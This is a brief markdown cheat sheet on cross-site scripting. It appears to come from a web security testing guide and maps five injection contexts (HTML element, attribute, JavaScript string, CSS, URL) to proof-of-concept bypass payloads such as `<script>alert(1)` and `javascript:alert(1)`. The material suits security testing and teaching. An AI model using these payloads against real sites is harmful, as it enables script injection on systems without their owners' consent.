# Context Analysis

## Summary
Identify the injection context to craft the right payload.

## Contexts

| Context | Example | Bypass |
|---------|---------|--------|
| HTML element | `<div>INPUT</div>` | `<script>alert(1)` |
| HTML attribute | `<a href="INPUT">` | `" onclick=alert(1)` |
| JS string | `var x = 'INPUT'` | `';alert(1)//` |
| CSS | `<style>body{INPUT}` | `background:url("x");` |
| URL | `<a href="INPUT">` | `javascript:alert(1)` |
